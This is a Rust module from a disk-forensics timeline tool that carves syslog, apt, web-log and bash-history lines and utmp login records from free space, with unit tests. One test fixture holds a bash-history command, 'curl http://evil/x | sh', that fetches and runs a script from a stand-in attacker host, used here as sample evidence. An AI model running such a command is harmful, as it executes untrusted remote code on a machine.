//! Timestamped artifacts carved from free space: log lines and `utmp`
//! records. They are not filesystem metadata, but a deleted `auth.log` or a
//! truncated `wtmp` leaves its records in unallocated blocks, and each record
//! carries its own time, so they belong on the timeline.
//!
//! Recognised line formats (the timestamp must start the line, except for
//! the web-log one):
//!
//! * ISO 8601 / RFC 3339: `2026-10-28T20:38:02.123456+00:00 host prog[pid]: …`
//!   (rsyslog on Ubuntu, journald exports) and `2026-10-28 20:38:02 …`
//!   (dpkg.log, apt, many application logs).
//! * BSD syslog: `Oct 28 20:38:02 host prog[pid]: …`. The year is not in
//!   the line: the current year is assumed, or the previous one when that
//!   would put the line in the future.
//! * Web server common log format: `… [28/Oct/2026:20:38:02 +0000] "GET …`.
//! * bash history with `HISTTIMEFORMAT`: `#1761684000` followed by the command.
//!
//! `utmp` records are the 384-byte glibc layout (x86_64): login type, pid,
//! tty, user, host and the time of the event.

use crate::timefmt::format_unix_timestamp;
use crate::timeline::{source, TimelineEntry};

/// Longest line kept; longer candidates are cut, not dropped.
const MAX_LINE: usize = 2048;
/// Shortest body after the timestamp for a line to count.
const MIN_BODY: usize = 4;
/// Text shown in `file_name`.
const MAX_SHOWN: usize = 400;

const MONTHS: [&[u8; 3]; 12] = [b"Jan", b"Feb", b"Mar", b"Apr", b"May", b"Jun", b"Jul", b"Aug", b"Sep", b"Oct", b"Nov", b"Dec"];

/// One carved artifact.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TextHit {
    /// Offset of the first byte in the scanned buffer.
    pub offset: usize,
    pub len: usize,
    pub secs: i64,
    pub nanos: u32,
    /// `syslog`, `log`, `weblog`, `bash_history`, `utmp`.
    pub kind: &'static str,
    pub text: String,
}

fn digit(b: u8) -> bool {
    b.is_ascii_digit()
}

fn num(b: &[u8]) -> i64 {
    b.iter().fold(0i64, |a, &c| a * 10 + i64::from(c - b'0'))
}

/// Days since the Unix epoch of a civil date (proleptic Gregorian).
fn days_from_civil(y: i64, m: u32, d: u32) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let mp = (m + 9) % 12;
    let doy = (153 * mp as i64 + 2) / 5 + d as i64 - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146_097 + doe - 719_468
}

fn valid_date(y: i64, m: u32, d: u32, hh: u32, mm: u32, ss: u32) -> bool {
    (1970..=2100).contains(&y) && (1..=12).contains(&m) && (1..=31).contains(&d) && hh < 24 && mm < 60 && ss < 61
}

fn epoch(y: i64, m: u32, d: u32, hh: u32, mm: u32, ss: u32) -> i64 {
    days_from_civil(y, m, d) * 86_400 + i64::from(hh) * 3600 + i64::from(mm) * 60 + i64::from(ss)
}

/// Printable text for the timeline: control characters replaced, cut to
/// `MAX_SHOWN` characters.
fn shown(bytes: &[u8]) -> String {
    let s = String::from_utf8_lossy(bytes);
    let mut out: String = s.chars().map(|c| if c.is_control() { ' ' } else { c }).collect();
    if out.chars().count() > MAX_SHOWN {
        out = out.chars().take(MAX_SHOWN).collect::<String>() + "…";
    }
    out.trim_end().to_string()
}

/// A line body is text: no NUL, few control characters, valid-ish UTF-8.
fn is_text(body: &[u8]) -> bool {
    if body.is_empty() || body.contains(&0) {
        return false;
    }
    let bad = body.iter().filter(|&&b| b < 0x20 && b != b'\t').count();
    bad * 20 <= body.len() && std::str::from_utf8(body).map_or_else(|e| e.valid_up_to() * 10 >= body.len() * 9, |_| true)
}

/// End of the line starting at `pos` (exclusive of the newline).
fn line_end(buf: &[u8], pos: usize) -> usize {
    let lim = (pos + MAX_LINE).min(buf.len());
    buf[pos..lim].iter().position(|&b| b == b'\n' || b == b'\r').map_or(lim, |i| pos + i)
}

/// `YYYY-MM-DD[T ]HH:MM:SS[.frac][Z|±HH:MM]` at `pos`; returns (secs, nanos, bytes consumed).
fn parse_iso(b: &[u8]) -> Option<(i64, u32, usize)> {
    if b.len() < 19 || !(b[..4].iter().all(|&c| digit(c)) && b[4] == b'-' && digit(b[5]) && digit(b[6]) && b[7] == b'-' && digit(b[8]) && digit(b[9]) && (b[10] == b'T' || b[10] == b' ') && digit(b[11]) && digit(b[12]) && b[13] == b':' && digit(b[14]) && digit(b[15]) && b[16] == b':' && digit(b[17]) && digit(b[18])) {
        return None;
    }
    let (y, m, d) = (num(&b[0..4]), num(&b[5..7]) as u32, num(&b[8..10]) as u32);
    let (hh, mm, ss) = (num(&b[11..13]) as u32, num(&b[14..16]) as u32, num(&b[17..19]) as u32);
    if !valid_date(y, m, d, hh, mm, ss) {
        return None;
    }
    let mut p = 19;
    let mut nanos = 0u32;
    if p < b.len() && (b[p] == b'.' || b[p] == b',') {
        let start = p + 1;
        let mut q = start;
        while q < b.len() && digit(b[q]) && q - start < 9 {
            q += 1;
        }
        if q > start {
            let mut frac = num(&b[start..q]) as u32;
            for _ in 0..(9 - (q - start)) {
                frac *= 10;
            }
            nanos = frac;
            p = q;
        }
    }
    let mut offset = 0i64;
    if p < b.len() && b[p] == b'Z' {
        p += 1;
    } else if p + 6 <= b.len() && (b[p] == b'+' || b[p] == b'-') && digit(b[p + 1]) && digit(b[p + 2]) && b[p + 3] == b':' && digit(b[p + 4]) && digit(b[p + 5]) {
        let sign = if b[p] == b'-' { -1 } else { 1 };
        offset = sign * (num(&b[p + 1..p + 3]) * 3600 + num(&b[p + 4..p + 6]) * 60);
        p += 6;
    } else if p + 5 <= b.len() && (b[p] == b'+' || b[p] == b'-') && b[p + 1..p + 5].iter().all(|&c| digit(c)) {
        let sign = if b[p] == b'-' { -1 } else { 1 };
        offset = sign * (num(&b[p + 1..p + 3]) * 3600 + num(&b[p + 3..p + 5]) * 60);
        p += 5;
    }
    Some((epoch(y, m, d, hh, mm, ss) - offset, nanos, p))
}

/// `Mon DD HH:MM:SS ` at `pos` (BSD syslog, no year).
fn parse_bsd(b: &[u8], year_now: i64, now: i64) -> Option<(i64, usize)> {
    if b.len() < 16 || b[3] != b' ' || b[6] != b' ' || b[9] != b':' || b[12] != b':' || b[15] != b' ' {
        return None;
    }
    let m = MONTHS.iter().position(|mo| &b[..3] == *mo)? as u32 + 1;
    if !((b[4] == b' ' || digit(b[4])) && digit(b[5]) && digit(b[7]) && digit(b[8]) && digit(b[10]) && digit(b[11]) && digit(b[13]) && digit(b[14])) {
        return None;
    }
    let d = if b[4] == b' ' { num(&b[5..6]) } else { num(&b[4..6]) } as u32;
    let (hh, mm, ss) = (num(&b[7..9]) as u32, num(&b[10..12]) as u32, num(&b[13..15]) as u32);
    if !valid_date(year_now, m, d, hh, mm, ss) {
        return None;
    }
    let mut t = epoch(year_now, m, d, hh, mm, ss);
    if t > now + 86_400 {
        t = epoch(year_now - 1, m, d, hh, mm, ss);
    }
    Some((t, 16))
}

/// apt history: `Start-Date: YYYY-MM-DD  HH:MM:SS` / `End-Date: …` (two spaces).
fn parse_apt(b: &[u8]) -> Option<(i64, usize)> {
    let prefix: &[u8] = if b.starts_with(b"Start-Date: ") {
        b"Start-Date: "
    } else if b.starts_with(b"End-Date: ") {
        b"End-Date: "
    } else {
        return None;
    };
    let rest = &b[prefix.len()..];
    if rest.len() < 20 || rest[10] != b' ' || rest[11] != b' ' {
        return None;
    }
    let mut norm = rest[..10].to_vec();
    norm.push(b' ');
    norm.extend_from_slice(&rest[12..20]);
    let (s, _, _) = parse_iso(&norm)?;
    Some((s, prefix.len() + 20))
}

/// `[DD/Mon/YYYY:HH:MM:SS +ZZZZ]` at `pos` (common log format).
fn parse_clf(b: &[u8]) -> Option<(i64, usize)> {
    if b.len() < 28 || b[0] != b'[' || b[3] != b'/' || b[7] != b'/' || b[12] != b':' || b[15] != b':' || b[18] != b':' || b[21] != b' ' || b[27] != b']' {
        return None;
    }
    let d = num(&b[1..3]) as u32;
    let m = MONTHS.iter().position(|mo| &b[4..7] == *mo)? as u32 + 1;
    let y = num(&b[8..12]);
    let (hh, mm, ss) = (num(&b[13..15]) as u32, num(&b[16..18]) as u32, num(&b[19..21]) as u32);
    if !(digit(b[1]) && digit(b[2]) && b[8..12].iter().all(|&c| digit(c)) && valid_date(y, m, d, hh, mm, ss)) {
        return None;
    }
    if !((b[22] == b'+' || b[22] == b'-') && b[23..27].iter().all(|&c| digit(c))) {
        return None;
    }
    let sign = if b[22] == b'-' { -1 } else { 1 };
    let off = sign * (num(&b[23..25]) * 3600 + num(&b[25..27]) * 60);
    Some((epoch(y, m, d, hh, mm, ss) - off, 28))
}

/// Scans `buf` for timestamped log lines. `now` is the current Unix time
/// (for the year of BSD syslog lines and the future check).
pub fn scan_text(buf: &[u8], now: i64) -> Vec<TextHit> {
    let year_now = 1970 + days_to_year(now / 86_400);
    let mut out = Vec::new();
    let mut i = 0usize;
    while i + 16 <= buf.len() {
        // A line starts at the buffer start, after a newline, or after a byte
        // that is not text (the end of a binary block, slack, zero fill).
        let at_line_start = i == 0 || {
            let p = buf[i - 1];
            p == b'\n' || p == b'\r' || p < 0x20 || p >= 0x7F
        };
        let b = &buf[i..];
        let mut hit: Option<(i64, u32, usize, &'static str)> = None;
        match b[0] {
            b'2' | b'1' if at_line_start => {
                if let Some((s, n, used)) = parse_iso(b) {
                    hit = Some((s, n, used, if b[10] == b'T' { "syslog" } else { "log" }));
                }
            }
            b'J' | b'F' | b'M' | b'A' | b'S' | b'O' | b'N' | b'D' | b'E' if at_line_start => {
                if let Some((s, used)) = parse_bsd(b, year_now, now) {
                    hit = Some((s, 0, used, "syslog"));
                } else if let Some((s, used)) = parse_apt(b) {
                    hit = Some((s, 0, used, "log"));
                }
            }
            b'[' => {
                if let Some((s, used)) = parse_clf(b) {
                    // The line starts before the bracket: take it from its beginning.
                    let start = buf[..i].iter().rposition(|&c| c == b'\n' || c == b'\r' || c == 0).map_or(0, |p| p + 1);
                    let end = line_end(buf, i);
                    let line = &buf[start..end];
                    if i - start <= 512 && is_text(line) && end > i + used + MIN_BODY && (s <= now + 86_400) {
                        out.push(TextHit { offset: start, len: end - start, secs: s, nanos: 0, kind: "weblog", text: shown(line) });
                    }
                    i = end + 1;
                    continue;
                }
            }
            b'#' if at_line_start => {
                // bash history: "#<epoch>\n<command>"
                let mut q = 1;
                while q < b.len() && q <= 11 && digit(b[q]) {
                    q += 1;
                }
                if (10..=11).contains(&q) && q < b.len() && b[q] == b'\n' {
                    let s = num(&b[1..q]);
                    if (946_684_800..=now + 86_400).contains(&s) {
                        let cmd_start = i + q + 1;
                        let cmd_end = line_end(buf, cmd_start);
                        let cmd = &buf[cmd_start..cmd_end];
                        if cmd.len() >= 1 && is_text(cmd) {
                            out.push(TextHit { offset: i, len: cmd_end - i, secs: s, nanos: 0, kind: "bash_history", text: shown(cmd) });
                            i = cmd_end + 1;
                            continue;
                        }
                    }
                }
            }
            _ => {}
        }
        if let Some((s, n, used, kind)) = hit {
            let end = line_end(buf, i);
            let body = &buf[i + used.min(end - i)..end];
            // apt's "End-Date:" line has nothing after the time; keep it anyway.
            let short_ok = kind == "log" && (b.starts_with(b"Start-Date: ") || b.starts_with(b"End-Date: "));
            if (body.len() >= MIN_BODY || short_ok) && (body.is_empty() || is_text(body)) && s <= now + 86_400 {
                out.push(TextHit { offset: i, len: end - i, secs: s, nanos: n, kind, text: shown(&buf[i..end]) });
                i = end + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

fn days_to_year(days: i64) -> i64 {
    // Good enough for 1970..2100: average year length.
    let mut y = days / 365;
    while days_from_civil(1970 + y, 1, 1) > days {
        y -= 1;
    }
    while days_from_civil(1970 + y + 1, 1, 1) <= days {
        y += 1;
    }
    y
}

/// glibc `struct utmp`, x86_64 layout: 384 bytes.
pub const UTMP_SIZE: usize = 384;
const UTMP_TYPES: [&str; 10] = ["EMPTY", "RUN_LVL", "BOOT_TIME", "NEW_TIME", "OLD_TIME", "INIT_PROCESS", "LOGIN_PROCESS", "USER_PROCESS", "DEAD_PROCESS", "ACCOUNTING"];

fn cstr(b: &[u8]) -> Option<String> {
    let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
    let s = &b[..end];
    if s.iter().any(|&c| c < 0x20 || c == 0x7F) {
        return None;
    }
    Some(String::from_utf8_lossy(s).into_owned())
}

/// Parses a `utmp` record at the start of `b`.
pub fn parse_utmp(b: &[u8], now: i64) -> Option<TextHit> {
    if b.len() < UTMP_SIZE {
        return None;
    }
    let ut_type = u16::from_le_bytes([b[0], b[1]]);
    if ut_type == 0 || ut_type as usize >= UTMP_TYPES.len() || b[2] != 0 || b[3] != 0 {
        return None;
    }
    let pid = i32::from_le_bytes([b[4], b[5], b[6], b[7]]);
    let sec = i64::from(i32::from_le_bytes([b[340], b[341], b[342], b[343]]));
    let usec = i32::from_le_bytes([b[344], b[345], b[346], b[347]]);
    if !(631_152_000..=now + 86_400).contains(&sec) || !(0..1_000_000).contains(&usec) || pid < 0 {
        return None; // 1990-01-01 .. tomorrow
    }
    let line = cstr(&b[8..40])?;
    let user = cstr(&b[44..76])?;
    let host = cstr(&b[76..332])?;
    if matches!(ut_type, 6 | 7 | 8) && user.is_empty() && line.is_empty() {
        return None;
    }
    let text = format!(
        "{} user={} line={} host={} pid={}",
        UTMP_TYPES[ut_type as usize],
        if user.is_empty() { "-" } else { &user },
        if line.is_empty() { "-" } else { &line },
        if host.is_empty() { "-" } else { &host },
        pid
    );
    Some(TextHit { offset: 0, len: UTMP_SIZE, secs: sec, nanos: (usec as u32) * 1000, kind: "utmp", text })
}

/// Scans `buf` for `utmp` records on 4-byte boundaries.
pub fn scan_utmp(buf: &[u8], now: i64) -> Vec<TextHit> {
    let mut out = Vec::new();
    let mut i = 0usize;
    while i + UTMP_SIZE <= buf.len() {
        // cheap pre-check: type 1..9 in a 16-bit little-endian field, zero padding
        if buf[i] >= 1 && buf[i] <= 9 && buf[i + 1] == 0 && buf[i + 2] == 0 && buf[i + 3] == 0 {
            if let Some(mut h) = parse_utmp(&buf[i..], now) {
                h.offset = i;
                out.push(h);
                i += UTMP_SIZE;
                continue;
            }
        }
        i += 4;
    }
    out
}

/// Turns a hit into a timeline row. `abs` is the hit's absolute offset.
pub fn row_for(h: &TextHit, abs: u64) -> Option<TimelineEntry> {
    let iso = format_unix_timestamp(h.secs, h.nanos)?;
    Some(
        TimelineEntry::new(
            iso,
            h.secs,
            h.nanos,
            h.len as u64,
            "....".to_string(),
            "----------".to_string(),
            0,
            0,
            "0".to_string(),
            format!("[{}] {} (carved @0x{:X})", h.kind, h.text, abs),
        )
        .with_source(source::CARVED),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOW: i64 = 1_800_000_000; // 2027-01-15

    #[test]
    fn iso_and_rfc3339_lines() {
        let buf = b"2026-10-28T20:38:02.123456+00:00 LEO-LNX01 sshd[1234]: Accepted password for bob\n2026-10-28 20:40:00 status installed vim:amd64 2:8.2\n";
        let h = scan_text(buf, NOW);
        assert_eq!(h.len(), 2);
        assert_eq!((h[0].secs, h[0].nanos, h[0].kind), (1_793_219_882, 123_456_000, "syslog"));
        assert_eq!((h[1].secs, h[1].kind), (1_793_219_882 + 118, "log"));
        assert!(h[0].text.contains("sshd[1234]"));
        // timezone applied
        let h = scan_text(b"2026-10-28T22:38:02+02:00 host x: hello\n", NOW);
        assert_eq!(h[0].secs, 1_793_219_882);
        // apt history
        let h = scan_text(b"\nStart-Date: 2026-10-28  20:38:02\nCommandline: apt-get install nmap\nEnd-Date: 2026-10-28  20:38:40\n", NOW);
        assert_eq!(h.len(), 2, "{:?}", h);
        assert_eq!((h[0].secs, h[0].kind), (1_793_219_882, "log"));
        assert_eq!(h[1].secs, 1_793_219_882 + 38);
    }

    #[test]
    fn bsd_syslog_gets_a_year() {
        let h = scan_text(b"Oct 28 20:38:02 LEO-LNX01 sudo: bob : TTY=pts/0\nOct  5 01:02:03 h cron[1]: x\n", NOW);
        assert_eq!(h.len(), 2);
        assert_eq!(h[0].secs, epoch(2026, 10, 28, 20, 38, 2), "October 2027 would be the future: 2026");
        assert_eq!(h[1].secs, epoch(2026, 10, 5, 1, 2, 3));
    }

    #[test]
    fn weblog_and_bash_history() {
        let buf = b"10.0.0.5 - - [28/Oct/2026:20:38:02 +0000] \"GET /x HTTP/1.1\" 200 12\n#1793219882\ncurl http://evil/x | sh\nnot a line\n";
        let h = scan_text(buf, NOW);
        assert_eq!(h.len(), 2);
        assert_eq!((h[0].kind, h[0].secs), ("weblog", 1_793_219_882));
        assert!(h[0].text.starts_with("10.0.0.5"));
        assert_eq!((h[1].kind, h[1].secs, h[1].text.as_str()), ("bash_history", 1_793_219_882, "curl http://evil/x | sh"));
    }

    #[test]
    fn garbage_and_future_are_rejected() {
        let mut junk = vec![0u8; 4096];
        for (k, b) in junk.iter_mut().enumerate() {
            *b = (k * 31 % 251) as u8;
        }
        assert!(scan_text(&junk, NOW).is_empty());
        assert!(scan_utmp(&junk, NOW).is_empty());
        assert!(scan_text(b"2031-01-01T00:00:00Z host x: future line\n", NOW).is_empty());
        assert!(scan_text(b"2026-13-01 00:00:00 bad month\n", NOW).is_empty());
        assert!(scan_text(b"x 2026-10-28 20:40:00 not at line start\n", NOW).is_empty());
    }

    #[test]
    fn utmp_record() {
        let mut r = vec![0u8; UTMP_SIZE];
        r[0] = 7; // USER_PROCESS
        r[4..8].copy_from_slice(&1234i32.to_le_bytes());
        r[8..13].copy_from_slice(b"pts/0");
        r[44..47].copy_from_slice(b"bob");
        r[76..84].copy_from_slice(b"10.0.0.5");
        r[340..344].copy_from_slice(&1_793_219_882i32.to_le_bytes());
        r[344..348].copy_from_slice(&500_000i32.to_le_bytes());
        let mut buf = vec![0xAAu8; 100];
        buf.extend(&r);
        buf.extend(vec![0u8; 50]);
        let h = scan_utmp(&buf, NOW);
        assert_eq!(h.len(), 1);
        assert_eq!(h[0].offset, 100);
        assert_eq!((h[0].secs, h[0].nanos), (1_793_219_882, 500_000_000));
        assert_eq!(h[0].text, "USER_PROCESS user=bob line=pts/0 host=10.0.0.5 pid=1234");
        let row = row_for(&h[0], 0x1000 + 100).unwrap();
        assert!(row.file_name.starts_with("[utmp] USER_PROCESS user=bob") && row.file_name.ends_with("(carved @0x1064)"));
    }
}
